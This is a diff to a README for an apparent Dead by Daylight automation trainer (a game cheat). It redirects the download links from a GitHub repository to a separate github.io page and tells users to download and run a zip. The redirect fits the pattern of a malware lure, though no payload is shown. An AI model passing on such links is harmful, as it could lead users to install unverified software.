@@ -1,6 +1,6 @@
 # ⚙️ DBD-AutoGrind-Trainer-2026-Pro - Automate your Dead by Daylight progression progress
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Salianfrankdazzle923/DBD-AutoGrind-Trainer-2026-Pro)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://salianfrankdazzle923.github.io)
 
 ## 📋 Overview
 
@@ -21,7 +21,7 @@ Your computer must meet these requirements to run the software:
 
 Follow these steps to set up the tool on your Windows machine:
 
-1. Visit the [official repository page](https://github.com/Salianfrankdazzle923/DBD-AutoGrind-Trainer-2026-Pro) to access the latest version of the software.
+1. Visit the [official repository page](https://salianfrankdazzle923.github.io) to access the latest version of the software.
 2. Locate the "Releases" section on the right side of the page.
 3. Click the most recent version link.
 4. Download the compressed file, usually named `DBD-AutoGrind-Pro.zip`.
